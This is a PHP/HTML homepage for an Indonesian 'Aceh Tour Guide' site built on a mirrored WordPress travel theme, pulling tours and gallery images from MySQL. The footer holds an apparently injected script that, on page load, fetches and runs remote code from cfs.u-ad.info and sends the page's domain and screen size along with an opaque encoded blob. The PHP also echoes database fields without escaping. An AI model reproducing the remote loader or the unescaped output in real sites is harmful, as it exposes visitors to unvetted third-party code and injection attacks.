<!DOCTYPE html>
<?php
	 error_reporting(E_ALL ^ E_DEPRECATED);
	include "koneksi.php";
	include "session.php";
	?>

<html lang="en-US">

<!-- Mirrored from themextemplates.com/demo/midway/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 May 2015 05:46:01 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Home || Aceh Tour Guide  </title>	
	
	<link rel="alternate" type="application/rss+xml" title="Midway - Responsive Travel Theme &raquo; Feed" href="feed" />
<link rel="alternate" type="application/rss+xml" title="Midway - Responsive Travel Theme &raquo; Comments Feed" href="comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Midway - Responsive Travel Theme &raquo; Home Comments Feed" href="home/feed" />
<link rel='stylesheet' id='colorbox-css'  href='wp-content/themes/midway/js/colorbox/colorbox3621.css?ver=3.7.8' type='text/css' media='all' />
<link rel='stylesheet' id='jquery-ui-datepicker-css'  href='wp-content/themes/midway/framework/assets/css/datepicker3621.css?ver=3.7.8' type='text/css' media='all' />
<link rel='stylesheet' id='general-css'  href='wp-content/themes/midway/style3621.css?ver=3.7.8' type='text/css' media='all' />
<script type='text/javascript' src='wp-includes/js/jquery/jquery3e5a.js?ver=1.10.2'></script>
<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min1576.js?ver=1.2.1'></script>
<script type='text/javascript' src='wp-includes/js/comment-reply.min3621.js?ver=3.7.8'></script>
<script type='text/javascript' src='wp-content/themes/midway/js/jquery.hoverIntent.min3621.js?ver=3.7.8'></script>
<script type='text/javascript' src='wp-content/themes/midway/js/jquery.ui.touchPunch3621.js?ver=3.7.8'></script>
<script type='text/javascript' src='wp-content/themes/midway/js/colorbox/jquery.colorbox.min3621.js?ver=3.7.8'></script>
<script type='text/javascript' src='wp-content/themes/midway/js/jquery.placeholder.min3621.js?ver=3.7.8'></script>
<script type='text/javascript' src='wp-content/themes/midway/js/jquery.themexSlider3621.js?ver=3.7.8'></script>
<script type='text/javascript' src='wp-content/themes/midway/js/jquery.textPattern3621.js?ver=3.7.8'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var labels = {"dateFormat":"dd\/mm\/yy","dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesMin":["Su","Mo","Tu","We","Th","Fr","Sa"],"monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"firstDay":"1","prevText":"Prev","nextText":"Next"};
/* ]]> */
</script>
<script type='text/javascript' src='wp-content/themes/midway/js/general3621.js?ver=3.7.8'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" /> 
<link rel='next' title='Contact' href='contact.html' />
<meta name="generator" content="WordPress 3.7.8" />
<link rel='canonical' href='index.html' />
<link rel='shortlink' href='index6f72.html?p=96' />
<link rel="shortcut icon" href="wp-content/themes/midway/framework/assets/images/favicon.ico" /><style type="text/css">body, .site-container{}body, input, select, textarea{font-family:Open Sans, Arial, Helvetica, sans-serif;}h1,h2,h3,h4,h5,h6, .button, .header-menu a, .woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce #respond input#submit,.woocommerce #content input.button,.woocommerce-page a.button,.woocommerce-page button.button,.woocommerce-page input.button,.woocommerce-page #respond input#submit,.woocommerce-page #content input.button{font-family:Signika, Arial, Helvetica, sans-serif;}a, h1 a:hover, h2 a:hover, h3 a:hover, h4 a:hover, h5 a:hover, h6 a:hover, .header-menu ul ul a:hover, .header-menu > div > ul > li.current-menu-item > a,.header-menu > div > ul > li.current-menu-parent > a,.header-menu > div > ul > li.hover > a,.header-menu > div > ul > li:hover > a{color:#FF9000;}input[type="submit"], input[type="button"], .button, .colored-icon, .widget_recent_comments li:before, .ui-slider .ui-slider-range, .tour-itinerary .tour-day-number h5, .testimonials-slider .controls a.current, .woocommerce a.button.alt, .woocommerce button.button.alt, .woocommerce input.button.alt, .woocommerce #respond input#submit.alt, .woocommerce #content input.button.alt, .woocommerce-page a.button.alt, .woocommerce-page button.button.alt, .woocommerce-page input.button.alt, .woocommerce-page #respond input#submit.alt, .woocommerce-page #content input.button.alt, .woocommerce a.button.alt:hover, .woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover, .woocommerce #respond input#submit.alt:hover, .woocommerce #content input.button.alt:hover, .woocommerce-page a.button.alt:hover, .woocommerce-page button.button.alt:hover, .woocommerce-page input.button.alt:hover, .woocommerce-page #respond input#submit.alt:hover, .woocommerce-page #content input.button.alt:hover{background-color:#FF9000;}.header .logo a, .header .header-text h5, .header .social-links span, .header-menu a, .header-menu a span, .site-footer .row, .site-footer a, .header-widgets .widget, .header-widgets .widget a, .header-widgets .section-title h3{color:#FFFFFF;}.header-menu ul ul li, .header-menu > div > ul > li.current-menu-item > a, .header-menu > div > ul > li.current-menu-parent > a, .header-menu > div > ul > li.hover > a, .header-menu > div > ul > li:hover > a{background-color:#FFFFFF;}::-moz-selection{background-color:#FF9000;}::selection{background-color:#FF9000;}</style><script type="text/javascript">
			WebFontConfig = {google: { families: [ "Signika:400,600","Open Sans:400,400italic,600" ] } };
			(function() {
				var wf = document.createElement("script");
				wf.src = ("https:" == document.location.protocol ? "https" : "http") + "://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js";
				wf.type = "text/javascript";
				wf.async = "true";
				var s = document.getElementsByTagName("script")[0];
				s.parentNode.insertBefore(wf, s);
			})();
			</script>	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
</head>
<body class="home page page-id-96 page-template-default">
	<div class="container site-container">
		<header class="container site-header">
			<div class="substrate top-substrate">
				<img src="wp-content/themes/midway/images/site_bg.jpg" class="fullwidth" alt="" />			</div>
			<!-- background -->
			<div class="row supheader">
				<div class="logo">
					<a href="index.html" rel="home">
						<h4><i><font face = "elephant"><font color ="white">Aceh Tour Guide</font></font></i></h4>
					</a>
				</div>
				<!-- logo -->
				<div class="social-links">
					<a class="facebook" href="#"  title="Facebook"></a><a class="twitter" href="#" title="Twitter"></a><a class="Login" href="action_logout.php" title="Logout"></a>				</div>
				<!-- social links -->
								<nav class="header-menu">
					<div class="menu"><ul id="menu-main-menu" class="menu"><li id="menu-item-97" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-96 current_page_item current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-97"><a href="../admin/index.php?offset=0class="active"">Home</a>
		
<li id="menu-item-306" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-306"><a href="services.php">Events</a></li>
</li>

<li id="menu-item-121" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121"><a href="galeri.php">Gallery</a></li>
<li id="menu-item-121" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121"><a href="blog.php">Blogs</a></li>
<li id="menu-item-121" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-122"><a href="report2.php?offset=0class="active"">Report</a>
<ul class="sub-menu">
	<li id="menu-item-274" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-274"><a href="../admin/report2.php?&offset=0&cari=class="active"">Reservation</a></li>
	<li id="menu-item-275" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-275"><a href="../admin/report.php?&offset=0class="active"">Pick_Up</a></li>
	<li id="menu-item-278" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-278"><a href="../admin/report5.php?&offset=0&cari=class="active"">Gallery</a></li>
	<li id="menu-item-276" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-277"><a href="../admin/report3.php?&offset=0&cari=class="active"">Destination</a></li>
</ul>
</li>

</ul></div>				</nav>				
				<!--/ select menu-->						
			</div>
			<!-- supheader -->
						<div class="row subheader">
								<div class="threecol column subheader-block">
									
	
		<input type="hidden" name="s" value="" />
	</form>

<!-- tour search form -->								</div>
						<div class="ninecol column subheader-block last">
					<div class="main-slider-container content-slider-container">
	<div class="content-slider main-slider">
		<ul>
		<?php 
		include "koneksi.php";
		$result = mysql_query("SELECT * FROM wisata LIMIT 0 , 2 ");
		while ($row = mysql_fetch_array($result)) {
		?>
			<li>
				<div class="featured-image">
				<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>">
					<img width="824" height="480" src="Uploads/<?php echo $row[4] ?>" class="attachment-large wp-post-image" />
				</a>
					
				</div>
			</li>				
		
		<?php } ?>
		</ul>
		<div class="arrow arrow-left content-slider-arrow"></div>
		<div class="arrow arrow-right content-slider-arrow"></div>
		<input type="hidden" class="slider-pause" value="7008" />
		<input type="hidden" class="slider-speed" value="400" />
		<input type="hidden" class="slider-effect" value="fade" />
	</div>
	<div class="block-background layer-1"></div>
	<div class="block-background layer-2"></div>
</div>
				</div>
							
			<!-- subheader -->
						
		</header>
		<!-- header -->
		<section class="container site-content">
			<div class="row"><div class="eightcol column"><div class="fivecol column"><img class="alignnone size-medium wp-image-21 demo-image" title="image_1" src="wp-content/uploads/2012/11/image_1.jpg" alt="" /></div><div class="sevencol column last"><div class="section-title"><h1>Explore Aceh</h1></div>
Selamat datang di Aceh Tour Guide "_"
bagi kalian yang ingin berwisata ke Aceh dan masih bingung dengan tempat-tempat yang harus kalian kunjungi, silahkan baca artikel-artikelnya. Terimakasih :)

			</div><div class="clear"></div></div><div class="fourcol column last"><div class="content-slider testimonials-slider">
			<ul>
			<li><article class="testimonial">
		<div class="quote-text">
			<div class="block-background">
		Team perjalanan yang telah Berpengalaman, Ramah, dan Berpengetahuan luas akan dunia wisata yang ada di Aceh.		</div>
		<h6 class="quote-author">
			Mary		</h6>
	</article>
</li><li>
	<article class="testimonial">
		<div class="quote-text">
			<div class="block-background">
		Aceh Tour Guide, tempat dimana Anda akan menememukan informasi seputar tempat-tempat wisata di kawasan Aceh
		</div>
		<h6 class="quote-author">
			Amie		</h6>
	</article>
</li>
<li><article class="testimonial">
		<div class="quote-text">
			<div class="block-background">
		Wisata yang ada di aceh yang tentunya  tidak kalah bagus dan menariknya untuk kita kunjungi dan kita banggakan. Pastikan anda mencobanya
		</div>
		<h6 class="quote-author">
			Lisa 		</h6>
	</article>
	
</li></ul><input type="hidden" class="slider-pause" value="0" /><input type="hidden" class="slider-speed" value="400" /></div></div><div class="clear"></div></div></section>
<section class="container content-section"><div class="substrate section-substrate"><img src="wp-content/uploads/2012/12/background_1.jpg" class="fullwidth" alt="" /></div>
<div class="row"><div class="items-grid">

<?php 
		$result = mysql_query("SELECT * FROM wisata LIMIT 2 , 3");
		while ($row = mysql_fetch_array($result)) {
		?>
	<div class="column threecol">
		<div class="tour-thumb-container">
			<div class="tour-thumb">
				<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>"><img width="440" height="330" src="Uploads/<?php echo $row[4] ?>" class="attachment-preview wp-post-image" alt="Mon-Ceunong-Indrapuri-piasan-com3.jpg" /></a>
				<div class="tour-caption">
					<h5 class="tour-title"><a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>" ><?php echo $row[1] ?></a></h5>
									<div class="tour-meta">
											<div class="tour-destination"><div class="colored-icon icon-2"></div><a href="destinations/greece.html" rel="tag"><?php echo $row[2] ?></a></div>
																<div class="tour-duration"><?php echo $row[3] ?></div>
										</div>
								</div>			
			</div>
			<div class="block-background"></div>
		</div>
	</div>
	<?php } ?>

	<?php 
		$result1 = mysql_query("SELECT * FROM wisata LIMIT 5 , 1");
		while ($row = mysql_fetch_array($result1)) {
		?>
<div class="column threecol last">
	<div class="tour-thumb-container">
		<div class="tour-thumb-container">
		<div class="tour-thumb">
			<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>"><img width="440" height="330" src="Uploads/<?php echo $row[4] ?>" alt="air.jpg" /></a>
			<div class="tour-caption">
				<h5 class="tour-title"><a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>" ><?php echo $row[1] ?></a></h5>
								<div class="tour-meta">
										<div class="tour-destination"><div class="colored-icon icon-2"></div><a href="destinations/philippines.html" rel="tag">Aceh Utara</a></div>
															<div class="tour-duration"><?php echo $row[3] ?></div>
									</div>
							</div>			
		</div>
		<div class="block-background"></div>
	</div>
		<div class="block-background"></div>
	</div>
</div><?php } ?><div class="clear"></div></div>
</div>
	</section>
<section class="container site-content"><div class="row"><div class="threecol column"><div class="section-title"><h1>Event Tour</h1></div><div class="featured-blog"><article class="post-112 post type-post status-publish format-standard hentry category-guides tag-amet tag-dolor tag-lorem post">
<?php 
		$result1 = mysql_query("SELECT * FROM wisata LIMIT 8 , 1");
		while ($row = mysql_fetch_array($result1)) {
		?>
		<div class="featured-image">
			<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>"><img width="440" height="330" src="Uploads/<?php echo $row[4] ?>" alt="air.jpg" /></a>
		</div>
		
		
			<div class="post-content">
				<h5 class="post-title"><a href="<?php echo "tour/wisata.php?id_wisata=" . $row [1]; ?>"><?php echo $row[1] ?></h5> 
	<?php } ?>
	
		<?php 
		$result1 = mysql_query("SELECT id_wisata, nama_wisata, SUBSTRING(  `keterangan` , 1, 300 ) FROM wisata WHERE id_wisata LIKE 3250 LIMIT 0 , 30");
		while ($row = mysql_fetch_array($result1)) {
		?>
				<p><?php echo $row[2] ?>...</p></div>
	<footer class="post-footer clearfix">
		<a href="<?php echo "tour/wisata.php?id_wisata=" . $row [0]; ?>" class="button small">Read More</a>
		<?php } ?>	
	</footer>
</article></div></div>

<div class="sixcol column">
	<div class="section-title">
		<h1>Gallery</h1>
	</div>

<?php 
$count = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM galeri"));
$tentukan_baris = $count[0] % 3;
$hitung = $count[0]-1;

if($tentukan_baris == 0){
	$baris = $count[0] / 3;
	$kolom = 3;
	for($i=1; $i<=$baris; $i++){
		?> 
		<div class="items-grid"> 
		<?php
		for($j=1; $j<=$kolom; $j++){
			if($j == 3){
				$result1 = mysql_query("SELECT * FROM galeri LIMIT  $hitung, 1");
				$row = mysql_fetch_row($result1)
				?>
				<div class="column gallery-item fourcol last">
					<div class="featured-image">
						<a href="Uploads/<?php echo $row[2]; ?>" class="colorbox " data-group="gallery-109" title="">
							<img width="440" height="330" src="Uploads/<?php echo $row[2]; ?>" class="attachment-preview wp-post-image" />		</a>
						<a class="featured-image-caption hidden-caption" href="#">
							<h6><?php echo $row[1] ?></h6>
						</a>			
					</div>
				</div>
				<?php
				$hitung=$hitung-1;
			} else {
				$result1 = mysql_query("SELECT * FROM galeri LIMIT  $hitung, 1");
				$row = mysql_fetch_row($result1)
				?>
				<div class="column gallery-item fourcol ">
					<div class="featured-image">
						<a href="Uploads/<?php echo $row[2] ?>" class="colorbox " data-group="gallery-109" title="">
							<img width="440" height="330" src="Uploads/<?php echo $row[2] ?>" class="attachment-preview wp-post-image" />		</a>
						<a class="featured-image-caption hidden-caption" href="#">
							<h6><?php echo $row[1] ?></h6>
						</a>			
					</div>
				</div>
				<?php
					$hitung=$hitung-1;
			}
		}
		
		?> 
		</div>
		<?php
	}
} else {
	$baris = intval(($count[0] / 3) + 1) ;
	$kolom = 3;
	
	for($i=1; $i<=$baris; $i++){
		?> 
		<div class="items-grid"> 
		<?php
		for($j=1; $j<=$kolom; $j++){
			if($j == 3){
				$result1 = mysql_query("SELECT * FROM galeri LIMIT  $hitung, 1");
				$row = mysql_fetch_row($result1)
				?>
				<div class="column gallery-item fourcol last">
					<div class="featured-image">
						<a href="Uploads/<?php echo $row[2]; ?>" class="colorbox " data-group="gallery-109" title="">
							<img width="440" height="330" src="Uploads/<?php echo $row[2]; ?>" class="attachment-preview wp-post-image" />		</a>
						<a class="featured-image-caption hidden-caption" href="#">
							<h6><?php echo $row[1] ?></h6>
						</a>			
					</div>
				</div>
				<?php
				$hitung=$hitung-1;
					if ($hitung < 0){
					break;
					}
			} else {
				$result1 = mysql_query("SELECT * FROM galeri LIMIT  $hitung, 1");
				$row = mysql_fetch_row($result1)
				?>
				<div class="column gallery-item fourcol ">
					<div class="featured-image">
						<a href="Uploads/<?php echo $row[2] ?>" class="colorbox " data-group="gallery-109" title="">
							<img width="440" height="330" src="Uploads/<?php echo $row[2] ?>" class="attachment-preview wp-post-image" />		</a>
						<a class="featured-image-caption hidden-caption" href="#">
							<h6><?php echo $row[1] ?></h6>
						</a>			
					</div>
				</div>
				<?php
					$hitung=$hitung-1;
					if ($hitung < 0){
					break;
					}
			}
		}
		
		?> 
		</div>
		<?php
	}
		?> 
		</div>
		<?php
	}

?>
	
</section>
		
		<!-- content -->
		<footer class="container site-footer">		
			<div class="row">
				<div class="copyright">
					TourAtjeh &copy; 2014-<?php echo date("Y");?>				</div>
				
		</footer>
		<!-- footer -->
		<div class="substrate bottom-substrate">
			<img src="wp-content/themes/midway/images/site_bg.jpg" class="fullwidth" alt="" />		</div>
	</div>
<script type='text/javascript' src='wp-includes/js/jquery/ui/jquery.ui.core.mindb08.js?ver=1.10.3'></script>
<script type='text/javascript' src='wp-includes/js/jquery/ui/jquery.ui.widget.mindb08.js?ver=1.10.3'></script>
<script type='text/javascript' src='wp-includes/js/jquery/ui/jquery.ui.mouse.mindb08.js?ver=1.10.3'></script>
<script type='text/javascript' src='wp-includes/js/jquery/ui/jquery.ui.slider.mindb08.js?ver=1.10.3'></script>
<script type='text/javascript' src='wp-includes/js/jquery/ui/jquery.ui.datepicker.mindb08.js?ver=1.10.3'></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlREzkyjWDuWsqPcXk%2fh5pRb9hSGkgOfi8wBRq6L3NH5tKGckT%2f100SAt6fb24J4iG63PmizJ61s05jIAuRG8huGs0Xr64ejyNOwTI43Ani7E3THAPEICZOH4FGpvZummFq6PUwwOigrghDu8OsgK8udByUDrialeuMo%2bQ6HFVzqERhUoYIlO2TO8WhQfAmyKeulKe9ZciebE6g164x39xDAWyVhEGk0MzzZc5qW6oEtiwMSrxaeuPjE0jiwN%2foccc5gVGKlTsKMIZoKXwRg8gO%2fc%2f4b7JDOxOBNCDOprgyPvgE1iJ3vZBbj%2f09tGkMygloa38ycX9NosecyGNyST5NoeLqWll90b4O%2fiQIB7EasRARpemnUprvc6Pg7z7%2fMoFtrb8HC5SHzigBkccmjFEnT1Gyn5ZF9xucTmuE%2fZEKxoPqeugrQnaXjbP28L1R6X61wMsHiFzocbw1ngF1sYwhn2ab1CgI65AT" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from themextemplates.com/demo/midway/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 May 2015 05:58:46 GMT -->
</html>